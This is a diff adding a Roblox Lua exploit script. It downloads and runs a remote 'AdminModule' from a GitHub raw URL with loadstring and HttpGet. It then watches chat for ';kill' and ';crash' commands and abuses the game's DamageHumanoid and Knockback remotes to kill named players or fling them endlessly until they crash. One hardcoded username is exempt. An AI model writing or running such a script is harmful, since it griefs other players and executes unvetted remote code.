@@ -1,0 +1,122 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local AdminModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyerCodes/main/AdminModule"))()
+local LocalPlayer = Players.LocalPlayer
+local godMode = {"VCBCCTrrbite"}
+
+local function executeHumanoidDamage(humanoid)
+    print("Executing damage on humanoid:", humanoid)
+    local args = {
+        [1] = humanoid,
+        [2] = "inf"
+    }
+    ReplicatedStorage.Remotes.DamageHumanoid:FireServer(unpack(args))
+end
+
+local function isCommand(msg)
+    return msg:match("^/w") or msg:match("^/team") or msg:match("^/c system") or msg:match("^;")
+end
+
+local function extractCommand(msg)
+    return msg:gsub("^/w", ""):gsub("^/team", ""):gsub("^/c system", ""):match("^%s*(.-)%s*$")
+end
+
+local function setupChatListener(plr)
+    plr.Chatted:Connect(function(msg)
+        if isCommand(msg) then
+            msg = extractCommand(msg)
+            print("Message received from", plr.Name, ":", msg)
+            local FirstWord, User = msg:match("^(;kill)%s*(.+)$")
+        
+            if FirstWord and User then
+                print("Kill command detected from", plr.Name, ". Checking admin status...")
+                if AdminModule.isAdmin(plr) then
+                    print(plr.Name, "is an admin. Proceeding to find target player.")
+                    local targetPlayer = Players:FindFirstChild(User:match("^%s*(.-)%s*$"))
+                    if targetPlayer then
+                        print("Target player found:", targetPlayer.Name)
+                        local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid")
+                        if humanoid then
+                            executeHumanoidDamage(humanoid)
+                        else
+                            print("Target player has no humanoid.")
+                        end
+                    else
+                        print("Target player not found.")
+                    end
+                else
+                    print(plr.Name, "is not an admin.")
+                end
+            else
+                print("No valid command detected in the message.")
+            end
+        end
+    end)
+end
+
+-- Set up chat listeners for existing players
+for _, player in pairs(Players:GetPlayers()) do
+    setupChatListener(player)
+end
+
+-- Set up chat listener for players who join later
+Players.PlayerAdded:Connect(function(player)
+    setupChatListener(player)
+end)
+
+local function knockBack(targetPlayer)
+    for _, username in ipairs(godMode) do
+        if targetPlayer.Name == username then
+            return
+        end
+    end
+
+    while true do
+        local character = targetPlayer.Character
+        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+        
+        if humanoidRootPart then
+            local args = {
+                [1] = humanoidRootPart,
+                [2] = Vector3.new(math.huge, math.huge, math.huge)
+            }
+            ReplicatedStorage.Remotes.Knockback:FireServer(unpack(args))
+        end
+        
+        wait(0.1)
+    end
+end
+
+local function executeCrash(targetPlayer)
+    spawn(function()
+        knockBack(targetPlayer)
+    end)
+end
+
+local function setupChatListener2(plr)
+    plr.Chatted:Connect(function(msg)
+        if isCommand(msg) then
+            msg = extractCommand(msg)
+            local command, User = msg:match("^(;crash)%s*(.+)$")
+        
+            if command and User then
+                if AdminModule.isAdmin(plr) then
+                    local targetPlayer = Players:FindFirstChild(User:match("^%s*(.-)%s*$"))
+                    if targetPlayer then
+                        executeCrash(targetPlayer)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+-- Set up chat listeners for existing players
+for _, player in pairs(Players:GetPlayers()) do
+    setupChatListener2(player)
+end
+
+-- Set up chat listener for players who join later
+Players.PlayerAdded:Connect(function(player)
+    setupChatListener2(player)
+end)
